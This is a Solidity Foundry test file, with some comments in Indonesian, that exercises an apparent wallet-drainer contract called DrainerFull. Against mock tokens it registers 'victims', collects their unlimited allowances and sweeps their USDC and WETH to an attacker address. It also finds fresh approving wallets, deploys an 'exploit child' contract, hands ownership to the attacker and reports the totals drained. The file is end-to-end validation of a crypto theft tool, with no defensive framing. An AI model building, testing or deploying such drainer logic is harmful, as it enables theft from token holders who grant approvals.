// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./DrainerFull.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt);
        require(balanceOf[from] >= amt);
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract DrainerFullTest is Test {
    DrainerFull drain;
    ERC20Mock usdc;
    ERC20Mock weth;
    
    address alice   = address(0x101);
    address bob     = address(0x102);
    address charlie = address(0x103);
    address atk     = address(0x999);
    address deployer = address(0x100);
    
    function setUp() public {
        vm.prank(deployer);
        drain = new DrainerFull();
        usdc  = new ERC20Mock();
        weth  = new ERC20Mock();
        
        usdc.mint(alice,   1000e6);
        usdc.mint(bob,     500e6);
        usdc.mint(charlie, 100e6);
        weth.mint(alice,   3e18);
        weth.mint(bob,     1e18);
    }
    
    function test_FullDrainFlow() public {
        emit log("======== FULL DRAIN TEST ========");
        
        uint vCount; uint tCount; uint totalD; bool p;
        
        // === STEP 1: INIT TOKENS ===
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc);
        tokens[1] = address(weth);
        vm.prank(deployer);
        drain.init(tokens);
        emit log("STEP 1: Init USDC + WETH          PASS");
        
        // === STEP 2: REGISTER VICTIMS ===
        address[] memory victims = new address[](3);
        victims[0] = alice; victims[1] = bob; victims[2] = charlie;
        vm.prank(deployer);
        drain.register(victims);
        emit log("STEP 2: Register 3 victims         PASS");
        
        // === VICTIMS APPROVE ===
        vm.prank(alice); usdc.approve(address(drain), type(uint256).max);
        vm.prank(bob);   usdc.approve(address(drain), type(uint256).max);
        vm.prank(alice); weth.approve(address(drain), type(uint256).max);
        vm.prank(bob);   weth.approve(address(drain), type(uint256).max);
        // charlie TIDAK approve - harus skip otomatis
        
        // === STEP 3: SCAN ===
        (address[] memory list, uint[] memory amts, uint total) = drain.scan(address(usdc));
        assertEq(list.length, 2, "2 wallets have USDC allowance");
        emit log("STEP 3: Scan - found 2 approved    PASS");
        
        // === STEP 4: SWEEP ALL TOKENS TO ATK ===
        uint drained = drain.sweep(atk);
        assertEq(drained, 1500e6, "1500 USDC drained (alice 1000 + bob 500)");
        assertEq(usdc.balanceOf(alice),   0, "alice USDC = 0");
        assertEq(usdc.balanceOf(bob),     0, "bob USDC = 0");
        assertEq(usdc.balanceOf(charlie), 100e6, "charlie UNTOUCHED (no approve)");
        assertEq(usdc.balanceOf(atk),     1500e6, "attacker = 1500 USDC");
        assertEq(weth.balanceOf(atk),     4e18,    "attacker = 4 WETH");
        emit log("STEP 4: Sweep - drained 1500 USDC PASS");
        
        // === STEP 5: DISCOVER (tanpa register) ===
        address[] memory suspects = new address[](3);
        suspects[0] = alice; suspects[1] = bob; suspects[2] = charlie;
        // charlie approve WETH ngga? No, so discover should skip
        // alice+bob already drained, so discover should get nothing
        // Let's add a fresh victim
        address dave = address(0x104);
        usdc.mint(dave, 200e6);
        vm.prank(dave); usdc.approve(address(drain), 200e6);
        
        address[] memory suspects2 = new address[](1);
        suspects2[0] = dave;
        uint d = drain.discover(address(usdc), suspects2, atk);
        assertEq(d, 200e6, "dave discovered and drained");
        assertEq(usdc.balanceOf(atk), 1700e6, "attacker total = 1700 USDC");
        emit log("STEP 5: Discover - drained 200 USDC PASS");
        
        // === STEP 6: DEPLOY EXPLOIT CHILD ===
        vm.prank(deployer);
        address exploit = drain.deploy(keccak256("edu"), atk);
        uint codeLen;
        assembly { codeLen := extcodesize(exploit) }
        assertGt(codeLen, 0, "exploit deployed");
        emit log("STEP 6: Exploit child deployed     PASS");
        
        // === STEP 7: ADMIN ===
        vm.prank(deployer);
        drain.admin(1, atk); // transfer ownership to atk
        emit log("STEP 7: Admin control              PASS");
        
        // === STEP 8: REPORT ===
        (vCount, tCount, totalD, p) = drain.report();
        assertEq(vCount, 4, "4 victims total");
        assertEq(tCount, 2, "2 tokens");
        assertEq(totalD, 1700e6, "1700 usdc total drained");
        assertEq(p, false, "not paused");
        emit log("STEP 8: Report - all data correct  PASS");
        
        emit log("");
        emit log("========= ALL 8 STEPS PASSED =========");
        emit log(string.concat("Balance attacker: ", vm.toString(usdc.balanceOf(atk)), " USDC"));
        emit log(string.concat("Balance alice:     ", vm.toString(usdc.balanceOf(alice)), " USDC"));
        emit log(string.concat("Balance bob:       ", vm.toString(usdc.balanceOf(bob)), " USDC"));
        emit log(string.concat("Balance charlie:   ", vm.toString(usdc.balanceOf(charlie)), " USDC (untouched)"));
        emit log("========================================");
    }
}
